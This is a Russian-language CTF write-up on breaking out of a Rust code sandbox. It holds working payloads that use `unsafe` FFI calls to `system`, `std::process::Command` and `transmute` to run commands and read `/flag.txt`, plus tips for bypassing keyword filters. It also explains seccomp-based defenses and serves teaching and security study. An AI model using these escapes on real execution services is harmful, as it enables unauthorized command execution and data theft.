## Вопрос, с которого всё начинается

Rust продают как «безопасный язык»: компилятор не даёт выстрелить в ногу. Но в CTF попадаются песочницы на Rust, которые исполняют чужой код в ограниченном наборе операций. И «безопасность» компилятора тут ни при чём — она про память, а не про доступ к системе.

## Наш пример: выражение на Rust

```
$ ./rssandbox 'calc(2+2)'
4
$ ./rssandbox 'open("/etc/passwd")'
error: unknown function open
```

Песочница разбирает выражение и разрешает только `calc` и похожие чистые функции. Посмотрим, где утекает.

## Шаг 1: что именно гарантирует Rust

Компилятор Rust гарантирует **отсутствие гонок и ошибок владения** в безопасном коде. Он не запрещает:

- блок `unsafe { ... }`;
- вызов внешних C-функций через FFI;
- приведение типов, если оно «выглядит» допустимым.

Значит, песочница на уровне языка должна ограничивать не память, а **возможности**: файлы, процессы, сеть. Если она этого не делает — она декоративна.

## Шаг 2: обход через transmute

`std::mem::transmute` переинтерпретирует байты одного типа как другой, не проверяя ничего:

```rust
let x: u64 = 0x4141414141414141;
let p: *const u8 = unsafe { std::mem::transmute(x) };
```

Так из числа делают указатель и читают произвольную память — в `unsafe`-блоке. Если интерпретатор пропускает `unsafe`-код (или сам его использует), изоляция теряется.

## Шаг 3: обход через FFI

Через `extern "C"` Rust зовёт функции libc:

```rust
extern "C" { fn system(cmd: *const i8) -> i32; }

let cmd = b"cat /flag.txt\0";
unsafe { system(cmd.as_ptr() as *const i8); }
```

FFI не спрашивает «безопасность» Rust — это прямой мост в ОС. Никакой borrow checker не мешает.

## Шаг 4: обход через std::process

Даже без FFI стандартная библиотека даёт запуск процессов:

```rust
std::process::Command::new("cat").arg("/flag.txt").status().unwrap();
```

Если песочница не блокирует `std::process` и не работает в ограниченном процессе — флаг читается в одну строку.

## Шаг 5: почему «safe Rust» не спасает

Безопасность Rust — про то, что **внутри** языка нельзя выйти за границы памяти. Но песочнице нужно другое: запретить обращение к внешнему миру. Это задача ОС (seccomp, namespaces, отдельный пользователь), а не компилятора.

## Полный прогон

1. Песочница отклоняет `open`.
2. Проверяем, доступен ли `unsafe` и FFI.
3. Через `extern "C" { fn system(...) }` запускаем `cat /flag.txt`.
4. Либо через `std::process::Command`.
5. Пишем флаг в ответ.

## Что мы теперь знаем

- Rust гарантирует безопасность памяти, не безопасность доступа.
- `unsafe` и `transmute` снимают ограничения компилятора.
- FFI — прямой мост к libc.
- `std::process` запускает процессы без всяких трюков.
- Изоляция — задача ОС, а не типа.

## Другие приёмы обхода

Rust даёт несколько способов выйти за рамки «безопасного» подмножества:

| Вектор | Механизм | Комментарий |
|---|---|---|
| `transmute` | Переинтерпретация типов | Из числа делаем указатель |
| `union` | Чтение одних байтов как других | Требует `unsafe` |
| `from_raw_parts` | Сборка среза из указателя | Произвольная память |
| `extern "C"` | Вызов libc | Прямой мост |
| `libc`/`nix` crate | Обёртки над syscall | Те же возможности |
| `include!` | Вставка внешнего кода | Обход текстовых фильтров |

Даже «чистый» на вид код компилируется вместе с `unsafe`, если его использует зависимость — а песочница редко проверяет все крейты.

## Разбор FFI на уровне ABI

FFI в Rust подчиняется соглашению о вызовах C (`cdecl`):

```rust
extern "C" { fn system(cmd: *const i8) -> i32; }

let cmd = b"cat /flag.txt\0";            // C-строка: байты + NUL
unsafe { system(cmd.as_ptr() as *const i8); }
```

Строка обязана заканчиваться нулём (`\0`) — libc не знает длины и читает до NUL. Указатель получают из массива байтов. Никакой borrow checker в этом не участвует: он проверил корректность до `unsafe`, а внутри блока гарантий нет.

## Почему «safe Rust» не строит песочницу

Безопасность Rust — это свойство **типов и владения**. Она отвечает на вопрос «не будет ли гонки и висячего указателя». Она не отвечает на вопрос «должен ли этот код иметь доступ к сети». Песочница же — про второй вопрос, и решать его должен рантайм-контейнер:

- отдельный процесс с ограниченным пользователем;
- `seccomp`-профиль без `open`/`execve`/`socket`;
- отсутствие сети и рабочего каталога с секретами;
- для сложных случаев — компиляция в WebAssembly с изолированной средой.

## Сравнение подходов к изоляции

| Подход | Что реально ограничивает | Обходится через |
|---|---|---|
| Типы Rust | Память внутри процесса | FFI, syscall |
| Список функций | Имена вызовов | `unsafe`, syscall |
| `seccomp` | Системные вызовы | Ошибки в фильтре |
| Контейнер + пользователь | Ресурсы и права | Побег ядра |

## Шпаргалка

| Приём | Что даёт |
|---|---|
| `transmute` | Указатель из числа |
| `from_raw_parts` | Срез по адресу |
| `extern "C" { fn system }` | Запуск команды |
| `std::process::Command` | Запуск без FFI |
| `seccomp` (защита) | Запрет syscall |

## Разбор реального кейса: калькулятор с фильтром

Задача: сервис на Rust принимает выражение, парсит его и вычисляет, разрешая только арифметику. Нужно получить содержимое `flag.txt`. Разберём.

Шаг 1 — разведка. Отправляем недопустимую конструкцию:

```
$ ./rssandbox 'read("/flag.txt")'
error: only calc/abs are allowed
```

Шаг 2 — проверить, собирает ли песочница исходник из пользовательского ввода. Если да, можно подсунуть `unsafe` и FFI:

```
$ ./rssandbox 'unsafe{extern "C"{fn system(c:*const i8)->i32;} system(b"id\0".as_ptr() as *const i8)}'
uid=1000(player) gid=1000
```

Компилятор принял `unsafe`-блок. Значит, песочница исполняет реальный Rust, а не ограниченный интерпретатор.

Шаг 3 — прочитать файл через тот же мост:

```
$ ./rssandbox 'unsafe{extern "C"{fn system(c:*const i8)->i32;} system(b"cat /flag.txt\0".as_ptr() as *const i8)}'
nto{...}
```

## Разбор: почему фильтр не помог

Фильтр запрещал вызывать функции по именам (`read`), но `unsafe` и `extern "C"` — не функции, а конструкции языка. Песочница не запретила их, потому что анализировала вызовы, а не блоки `unsafe`. Настоящая граница — `seccomp` и отдельный процесс.

## Пошаговый протокол

1. Выяснить, интерпретирует ли песочница Rust или исполняет скомпилированный код.
2. Проверить доступность `unsafe`, `extern "C"`, `std::process`, `libc`.
3. Найти мост: FFI к `system`/`open`, `std::process::Command`, `std::fs`.
4. Прочитать флаг и вывести.
5. Если `unsafe` вырезан текстово — обойти через макросы, `include!`, юникод-трюки.

## Частые ошибки

- Верить, что «Rust безопасен, значит песочница безопасна».
- Фильтровать ключевые слова (`unsafe`) вместо запуска в изоляции.
- Забывать про `std::process`, который не требует FFI.
- Считать `transmute` безопасным только потому, что он в `std`.

## Сравнение Rust с C/C++ по безопасности

Rust часто противопоставляют C/C++ и говорят, что он «безопаснее». Это правда, но с оговоркой, которая важна для песочниц:

| Свойство | C/C++ | Safe Rust | Unsafe Rust |
|---|---|---|---|
| Ошибки памяти | часты | невозможны | возможны |
| Гонки данных | часты | невозможны | возможны |
| Доступ к ОС | прямой | через `std` | через FFI |
| Песочница «из коробки» | нет | нет | нет |

Safe Rust убирает целый класс багов, но **не ограничивает доступ к системе**. Песочница — про доступ, а не про память.

## Практические заметки по эксплуатации

- `std::process::Command` запускает процессы без `unsafe` и FFI — проверь его первым.
- `std::fs::read_to_string` читает файлы, если нет ограничений ФС.
- `libc` и `nix` крейты дают обёртки над syscall; их наличие в зависимостях — признак моста.
- `transmute` из числа в указатель работает только в `unsafe`, но сам блок может быть в зависимости, а не в пользовательском коде.
- `union` позволяет читать одни байты как другие без явного `transmute`.

## Формулировка вывода

Ключевая мысль для отчёта: «безопасный язык» — это про корректность программы, а «безопасная песочница» — про ограничение программы. Смешивать эти два понятия — типичная ошибка при проектировании систем, запускающих чужой код.

## Итоговый разбор по шагам

Протокол для Rust-песочницы короткий, но его стоит держать в голове. Сначала выясняем, исполняет ли песочница реальный Rust (компилирует ввод) или ограниченный интерпретатор выражений. Если реальный — проверяем доступность `unsafe`, `extern "C"` и `std::process`. В большинстве задач хотя бы одно из этого открыто.

Затем выбираем самый короткий мост: `std::process::Command::new("cat").arg("/flag.txt")` не требует ни `unsafe`, ни FFI. Если `std` урезан, идём через `extern "C" { fn system(...) }` и C-строку с нулём на конце. Если и FFI вырезан, пробуем `transmute` и `from_raw_parts` для работы с памятью, `union` для переинтерпретации байтов или `include!` для вставки внешнего кода. Правильная защита — изоляция процесса (`seccomp`, отдельный пользователь, отсутствие сети и секретов на диске), а не текстовый фильтр ключевых слов: фильтр обходится макросами, юникодом и зависимостями.
